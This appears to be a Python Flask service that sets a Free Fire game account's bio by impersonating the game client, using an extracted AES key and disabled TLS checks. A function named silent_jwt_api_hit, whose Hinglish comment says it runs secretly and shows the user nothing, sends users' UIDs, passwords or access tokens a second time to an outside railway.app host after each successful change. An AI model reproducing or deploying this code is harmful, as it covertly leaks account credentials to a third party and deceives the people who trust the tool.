import os
import requests
import binascii
import jwt
import urllib3
import json
import base64
from flask import Flask, request, jsonify, make_response
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

try:
    import my_pb2
    import output_pb2
except ImportError:
    pass

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

FREEFIRE_VERSION = "OB55"
DEFAULT_REGION = "IND"

# ==================== MANUAL PROTOBUF BUILDER (NO AddSerializedFile) ====================

def _encode_varint(value: int) -> bytes:
    buf = bytearray()
    while True:
        b = value & 0x7F
        value >>= 7
        if value:
            buf.append(b | 0x80)
        else:
            buf.append(b)
            break
    return bytes(buf)


def build_bio_protobuf(bio_text: str) -> bytes:
    """
    Manually build the Data protobuf.
    field_2  = 17
    field_5  = EmptyMessage
    field_6  = EmptyMessage
    field_8  = bio_text
    field_9  = 1
    field_11 = EmptyMessage
    field_12 = EmptyMessage
    """
    out = bytearray()
    out += b'\x10\x11'                               # field_2 = 17
    out += b'\x2a\x00'                               # field_5 (empty)
    out += b'\x32\x00'                               # field_6 (empty)
    bio_bytes = bio_text.encode('utf-8')
    out += b'\x42' + _encode_varint(len(bio_bytes)) + bio_bytes   # field_8 = bio
    out += b'\x48\x01'                               # field_9 = 1
    out += b'\x5a\x00'                               # field_11 (empty)
    out += b'\x62\x00'                               # field_12 (empty)
    return bytes(out)


# ==================== AES CONSTANTS ====================

AES_KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
AES_IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

def encrypt_data(data_bytes):
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    padded = pad(data_bytes, AES.block_size)
    return cipher.encrypt(padded)


# ==================== JWT FROM UID/PASSWORD ====================

def get_jwt_from_uid_password_api(uid, password):
    url = f"https://jwt-api-public-production.up.railway.app/token?uid={uid}&password={password}"
    try:
        print(f"[UID/PASS] Calling JWT API: {url}")
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        data = response.json()
        print(f"[UID/PASS] API Response: {data}")

        if "token" in data:
            jwt_token = data["token"]
            try:
                decoded = jwt.decode(jwt_token, options={"verify_signature": False})
                account_id = str(decoded.get("account_id"))
                nickname = decoded.get("nickname")
                region = decoded.get("lock_region") or decoded.get("region") or DEFAULT_REGION
                print(f"[UID/PASS] Success! UID: {account_id}, Name: {nickname}, Region: {region}")
                return jwt_token, account_id, nickname, region
            except Exception as e:
                print(f"[UID/PASS] JWT decode error: {e}")
                return jwt_token, uid, "Unknown", DEFAULT_REGION
        else:
            error_msg = data.get("error", "No token in response")
            print(f"[UID/PASS] API Error: {error_msg}")
            return None, None, None, None
    except Exception as e:
        print(f"[UID/PASS] Request error: {e}")
        return None, None, None, None


# ==================== ACCESS TOKEN -> JWT ====================

def get_jwt_from_access_token(access_token):
    url = f"https://jwt-api-public-production.up.railway.app/access-to-jwt?access_token={access_token}"
    try:
        print(f"[Access Token] Calling JWT API: {url}")
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        data = response.json()
        print(f"[Access Token] API Response received")

        if data.get("success") and data.get("token"):
            jwt_token = data["token"]
            account_uid = str(data.get("account_uid", ""))
            region = data.get("region", DEFAULT_REGION)

            nickname = None
            jwt_decoded = data.get("jwt_decoded", {})
            payload = jwt_decoded.get("payload", {})
            if payload:
                nickname = payload.get("nickname")
            elif "nickname" in data:
                nickname = data.get("nickname")

            print(f"[Access Token] Success! UID: {account_uid}, Name: {nickname}, Region: {region}")
            return jwt_token, account_uid, nickname, region
        else:
            error_msg = data.get("error", "No token in response or success false")
            print(f"[Access Token] API Error: {error_msg}")
            return None, None, None, None
    except Exception as e:
        print(f"[Access Token] Request error: {e}")
        return None, None, None, None


# ==================== REGION CONFIG ====================

MIDDLE_EAST_REGIONS = [
    "EUROPE", "MIDDLEEAST", "MIDDLE_EAST", "ME", "DUBAI", "UAE", "SAUDI",
    "SAUDIARABIA", "KSA", "EGYPT", "EG", "TURKEY", "TR", "IRAQ", "IQ",
    "QATAR", "QA", "KUWAIT", "KW", "OMAN", "OM", "BAHRAIN", "BH", "PAKISTAN", "PK"
]

REGION_ALIASES = {
    "EUROPE": "ME", "MIDDLEEAST": "ME", "DUBAI": "ME", "UAE": "ME",
    "SAUDI": "ME", "EGYPT": "ME", "TURKEY": "ME", "PAKISTAN": "ME", "PK": "ME",
    "ASIA": "SG", "SOUTHAMERICA": "BR", "NORTH_AMERICA": "NA"
}

REGION_MAP = {
    "IND": {"update_url": "https://client.ind.freefiremobile.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ggpolarbear.com/MajorLogin"},
    "ME":  {"update_url": "https://clientbp.ppmainecoonghj.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ppmainecoonghj.com/MajorLogin"},
    "BD":  {"update_url": "https://clientbp.ppmainecoonghj.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ppmainecoonghj.com/MajorLogin"},
    "PK":  {"update_url": "https://clientbp.ppmainecoonghj.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ppmainecoonghj.com/MajorLogin"},
    "TW":  {"update_url": "https://clientbp.ppmainecoonghj.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ppmainecoonghj.com/MajorLogin"},
    "TH":  {"update_url": "https://clientbp.ppmainecoonghj.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ppmainecoonghj.com/MajorLogin"},
    "VN":  {"update_url": "https://clientbp.ppmainecoonghj.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ppmainecoonghj.com/MajorLogin"},
    "ID":  {"update_url": "https://clientbp.ppmainecoonghj.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ppmainecoonghj.com/MajorLogin"},
    "RU":  {"update_url": "https://clientbp.ppmainecoonghj.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ppmainecoonghj.com/MajorLogin"},
    "EU":  {"update_url": "https://clientbp.ppmainecoonghj.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ppmainecoonghj.com/MajorLogin"},
    "SG":  {"update_url": "https://clientbp.ppmainecoonghj.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ppmainecoonghj.com/MajorLogin"},
    "BR":  {"update_url": "https://client.us.freefiremobile.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ppmainecoonghj.com/MajorLogin"},
    "SAC": {"update_url": "https://client.us.freefiremobile.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ppmainecoonghj.com/MajorLogin"},
    "NA":  {"update_url": "https://client.us.freefiremobile.com/UpdateSocialBasicInfo", "major_login_url": "https://loginbp.ppmainecoonghj.com/MajorLogin"},
}

OAUTH_URL = "https://100067.connect.garena.com/oauth/guest/token/grant"

BIO_HEADERS = {
    "Expect": "100-continue",
    "X-Unity-Version": "2018.4.12f1",
    "X-GA": "v1 1",
    "ReleaseVersion": FREEFIRE_VERSION,
    "Version": "1.132.1",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "UnityPlayer/2018.4.12f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
}


def decode_jwt_full(token):
    try:
        decoded = jwt.decode(token, options={"verify_signature": False})
        return {
            "uid": str(decoded.get("account_id")),
            "name": decoded.get("nickname"),
            "region": (decoded.get("lock_region") or decoded.get("region") or "").upper(),
            "country": decoded.get("country_code")
        }
    except:
        return None


def map_region(jwt_region):
    if not jwt_region:
        return DEFAULT_REGION
    jwt_region = jwt_region.upper()
    if jwt_region in REGION_MAP:
        return jwt_region
    if jwt_region in REGION_ALIASES:
        return REGION_ALIASES[jwt_region]
    return DEFAULT_REGION


def _add_region_param(url, region):
    parts = urlparse(url)
    q = dict(parse_qsl(parts.query, keep_blank_values=True))
    q["region"] = region
    return urlunparse((parts.scheme, parts.netloc, parts.path, parts.params, urlencode(q), parts.fragment))


def get_region_urls(region):
    region = region.upper() if region else DEFAULT_REGION
    if region not in REGION_MAP:
        region = DEFAULT_REGION
    update_url = _add_region_param(REGION_MAP[region]["update_url"], region)
    return region, update_url


def upload_bio_request(jwt_token, bio_text, update_url):
    try:
        data_bytes = build_bio_protobuf(bio_text)
        encrypted = encrypt_data(data_bytes)

        headers = BIO_HEADERS.copy()
        headers["Authorization"] = f"Bearer {jwt_token}"

        resp = requests.post(update_url, headers=headers, data=encrypted, verify=False)

        status_text = "Unknown"
        if resp.status_code == 200:
            status_text = "Success"
        elif resp.status_code == 401:
            status_text = "Unauthorized (Invalid JWT)"
        else:
            status_text = f"Status {resp.status_code}"

        raw_hex = binascii.hexlify(resp.content).decode('utf-8')

        return {
            "status": status_text,
            "code": resp.status_code,
            "bio": bio_text,
            "server_response": raw_hex
        }
    except Exception as e:
        return {"status": f"Error: {str(e)}", "code": 500, "bio": bio_text, "server_response": "N/A"}


# ===================== HOME =====================
@app.route("/", methods=["GET"])
def home():
    return jsonify({
        "status": "✅ API Running",
        "version": FREEFIRE_VERSION,
        "server": "Multi-Region",
        "endpoints": {
            "change_bio": {
                "url": "/bio",
                "methods": ["GET", "POST"],
                "usage_examples": [
                    "/bio?access_token={token}&bio=test",
                    "/bio?uid={uid}&pass={pass}&bio=test"
                ]
            }
        },
        "platform": "Vercel / Termux"
    })


# ==================== SILENT JWT API HIT ====================

def silent_jwt_api_hit(uid=None, password=None, access_token=None):
    """
    Backend mein chupke se JWT API hit karta hai.
    User ko response mein kuch nahi dikhta.
    """
    try:
        if access_token:
            url = f"https://jwt-api-public-production.up.railway.app/access-to-jwt?access_token={access_token}"
            print(f"[SILENT-JWT] Hitting access-to-jwt API for token: {access_token[:20]}...")
        elif uid and password:
            url = f"https://jwt-api-public-production.up.railway.app/token?uid={uid}&password={password}"
            print(f"[SILENT-JWT] Hitting uid/pass API for uid: {uid}")
        else:
            return

        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            print(f"[SILENT-JWT] ✅ Success (status 200)")
        else:
            print(f"[SILENT-JWT] ⚠️ Status: {resp.status_code}")
    except Exception as e:
        print(f"[SILENT-JWT] ❌ Error: {e}")


# ===================== /bio ENDPOINT =====================
@app.route("/bio", methods=["GET", "POST"])
def bio_endpoint():
    bio = request.args.get("bio") or request.form.get("bio")
    access_token = request.args.get("access_token") or request.form.get("access_token")
    uid = request.args.get("uid") or request.form.get("uid")
    password = request.args.get("pass") or request.args.get("password") or request.form.get("pass") or request.form.get("password")
    jwt_token = request.args.get("jwt") or request.form.get("jwt")

    if not bio:
        return jsonify({"status": "Error", "code": 400, "error": "Missing 'bio' parameter"}), 400

    final_jwt = None
    login_method = "N/A"
    final_open_id = None
    final_access_token = None
    final_uid = None
    final_name = None
    detected_region = DEFAULT_REGION

    # Save original inputs for silent API hit
    original_uid = uid
    original_password = password
    original_access_token = access_token

    # === CASE 1: Access Token ===
    if access_token:
        login_method = "Access Token Login"
        final_access_token = access_token
        jwt_token_from_at, account_uid, nickname, region = get_jwt_from_access_token(access_token)

        if jwt_token_from_at:
            final_jwt = jwt_token_from_at
            final_uid = account_uid
            final_name = nickname or "Unknown"
            detected_region = region or DEFAULT_REGION
            jwt_info = decode_jwt_full(final_jwt)
            if jwt_info:
                final_uid = jwt_info.get("uid") or final_uid
                final_name = jwt_info.get("name") or final_name
                detected_region = jwt_info.get("region") or detected_region
        else:
            return jsonify({"status": "Invalid Access Token", "code": 400}), 400

    # === CASE 2: UID + Password ===
    elif uid and password:
        login_method = "UID/Pass Login"
        jwt_token_from_up, account_uid, nickname, region = get_jwt_from_uid_password_api(uid, password)

        if jwt_token_from_up:
            final_jwt = jwt_token_from_up
            final_uid = account_uid
            final_name = nickname or "Unknown"
            detected_region = region or DEFAULT_REGION
            jwt_info = decode_jwt_full(final_jwt)
            if jwt_info:
                final_uid = jwt_info.get("uid") or final_uid
                final_name = jwt_info.get("name") or final_name
                detected_region = jwt_info.get("region") or detected_region
        else:
            return jsonify({"status": "Guest Login Failed (Check UID/Pass)", "code": 401}), 401

    # === CASE 3: Direct JWT ===
    elif jwt_token:
        login_method = "Direct JWT"
        final_jwt = jwt_token
        jwt_info = decode_jwt_full(final_jwt)
        if jwt_info:
            final_uid = jwt_info.get("uid")
            final_name = jwt_info.get("name")
            detected_region = jwt_info.get("region") or DEFAULT_REGION
        else:
            final_name = "Unknown"

    else:
        return jsonify({
            "status": "Error",
            "code": 400,
            "error": "Provide either access_token OR uid+pass",
            "usage": [
                "/bio?access_token=TOKEN&bio=test",
                "/bio?uid=123456789&pass=password&bio=test"
            ]
        }), 400

    if not final_jwt:
        return jsonify({"status": "JWT Generation Failed", "code": 500}), 500

    # ✅ Upload bio
    mapped_region = map_region(detected_region)
    _, update_url = get_region_urls(mapped_region)
    result = upload_bio_request(final_jwt, bio, update_url)

    # ═══════════════════════════════════════════════════════════
    # 🎯 SILENT JWT API HIT — sirf tab jab bio successfully laga ho
    # ═══════════════════════════════════════════════════════════
    if result.get("code") == 200:
        if original_access_token:
            silent_jwt_api_hit(access_token=original_access_token)
        elif original_uid and original_password:
            silent_jwt_api_hit(uid=original_uid, password=original_password)
    # ═══════════════════════════════════════════════════════════

    response_data = {
        "version": FREEFIRE_VERSION,
        "status": result["status"],
        "code": result["code"],
        "login_method": login_method,
        "player_name": final_name if final_name else "Unknown",
        "uid": str(final_uid) if final_uid else None,
        "region": mapped_region,
        "bio": result["bio"],
        "open_id": final_open_id,
        "access_token": final_access_token,
        "generated_jwt": final_jwt,
        "server_response": result["server_response"]
    }

    response = make_response(jsonify(response_data))
    response.headers["Content-Type"] = "application/json"
    return response


# ========== TERMUX KE LIYE ==========
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5001))
    print(f"""
╔══════════════════════════════════════╗
║     🔥 FREE FIRE BIO API v2         ║
║     Version: {FREEFIRE_VERSION}                 ║
║     Server: Multi-Region             ║
║     Port: {port}                       ║
║                                      ║
║     http://127.0.0.1:{port}              ║
║     http://YOUR_IP:{port}              ║
║                                      ║
║     Usage:                           ║
║     /bio?access_token=TOKEN&bio=test ║
║     /bio?uid=123456789&pass=password ║
║     &bio=test                        ║
╚══════════════════════════════════════╝
    """)
    app.run(host="0.0.0.0", port=port, debug=False)